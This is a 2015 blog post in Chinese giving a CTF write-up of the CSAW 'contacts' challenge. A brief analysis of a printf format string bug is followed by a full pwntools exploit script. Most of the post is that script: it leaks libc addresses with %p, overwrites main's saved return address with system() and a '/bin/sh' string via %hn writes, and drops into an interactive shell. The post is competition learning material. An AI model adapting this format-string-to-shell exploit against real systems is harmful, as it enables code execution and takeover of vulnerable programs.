---
layout: post
title: "csaw contacts_local"
date: 2015-09-21 01:12:39 +0800
comments: true
categories: 
---
0x00 分析

	int __cdecl disp_each_item(int a1, int a2, int a3, char *format)
	{
	  printf("\tName: %s\n", a1);
	  printf("\tLength %u\n", a2);
	  printf("\tPhone #: %s\n", a3);
	  printf("\tDescription: ");
	  return printf(format);
	}
明显的格式化字符串漏洞，先更改栈上的一个地址的低4位，可以改写栈附近的地址的高低4位，则可以再次改写任意地址,
程序nx,堆不可执行不确定，bss不可执行,官方没给libc版本，只好在本地测试，将main的eip改成system,后面加上/bin/sh的字符串地址和字符串


###0x01 exp

	from pwn import *

	#r = remote("192.168.56.101", 6666)
	r = process('./contacts')
	f = open("input", "w")


	def sl(t):
		r.sendline(t)
		f.write(t + "\n")



	def create(name, phone, desp):
		print r.recvuntil(">>>")
		sl("1")
		print r.recvuntil("Name:")
		sl(name)
		print r.recvuntil("nter Phone No:")
		sl(phone)
		print r.recvuntil("Length of description:")
		sl(str(len(desp)))
		print r.recvuntil("Enter description:")
		sl(desp)


	def remove(name):
		print r.recvuntil(">>>")
		sl("2")
		print r.recvuntil("Name to remove?")
		sl(name)


	def editdesp(name, desp):
		print r.recvuntil(">>>")
		sl("3")
		print r.recvuntil("Name to change?")
		sl(name)
		print r.recvuntil("description")
		sl('2')
		print r.recvuntil("description:")
		sl(str(len(desp)))
		print r.recvuntil("escription:")
		sl(desp)



	def disp():
		print r.recvuntil(">>>")
		sl("4")
		data = ''
		for i in range(3):
			data += r.recv(35)
			sleep(0.5)
		print data	
		return data

	def rebig(t):
		return int(hex(t)[2:6], 16)
	def resmall(t):
		return int(hex(t)[6:10], 16)



	def leakmem(n):
		create('n0', '10080', "%" + str(n) + "$p")
		data = disp()
		start = data.find("0x")
		data = data[start+2: start+10]
		remove('n0')
		return data


	s_6 = 0xfc58
	s_18 = 0xfc88
	s_18_ = 0xfc8a
	maineip = 0xfc8c
	real_18addr = 0
	real_18_addr = 0
	real_main_eip = 0
	real_main_eip_ = 0

	l_puts = 401904
	l_system = 241312
	r_puts = int(leakmem(2),16) - 11
	r_system = l_system - l_puts + r_puts

	create('n0', '10080', "%18$p")
	data = disp()
	start = data.find("0x")
	real_18addr = int(data[start+2: start+10], 16)
	real_18_addr = real_18addr + 2
	real_main_eip = maineip - s_18 + real_18addr
	real_main_eip_ = maineip - s_18 + real_18addr + 2
	editdesp('n0', 'dddd')



	def change(text):
		pay = "%" + str(resmall(real_18_addr)) + "x%6$hn"
		create('n1', '10086', pay)
		pay = "%" + str(rebig(text)) + "x%18$hn"
		create('n2', '10086', pay)
		pay = "%" + str(resmall(real_18addr)) + "x%6$hn"
		create('n3', '10080', pay)
		pay = "%" + str(resmall(text)) + "x%18$hn"
		create('n4', '10080', pay)
	def change_addr(addr,cont):
		change(addr)
		pay = "%" + str(resmall(cont)) + "x%30$hn"
		create('n5', '10068', pay)
		disp()
		remove('n1')
		remove('n2')
		remove('n3')
		remove('n4')
		remove('n5')
		
		change(addr+2)
		pay = "%" + str(rebig(cont)) + "x%30$hn"
		create('n5', '10086', pay)
		disp()
		remove('n0')
		remove('n1')
		remove('n2')
		remove('n3')
		remove('n4')
		remove('n5')

	binsh1 = 0x69622f41
	binsh2 = 0x68732f6e


	change_addr(real_main_eip, r_system)
	change_addr(real_main_eip + 8, real_main_eip + 13)
	change_addr(real_main_eip + 12, binsh1)
	change_addr(real_main_eip + 16, binsh2)


	print ("system",hex(r_system))
	print ("real_18addr",hex(real_18addr))
	print ("real_18_addr",hex(real_18_addr))
	print ("real_main_eip",hex(real_main_eip))
	print resmall(real_main_eip)

	f.close()
	r.interactive()
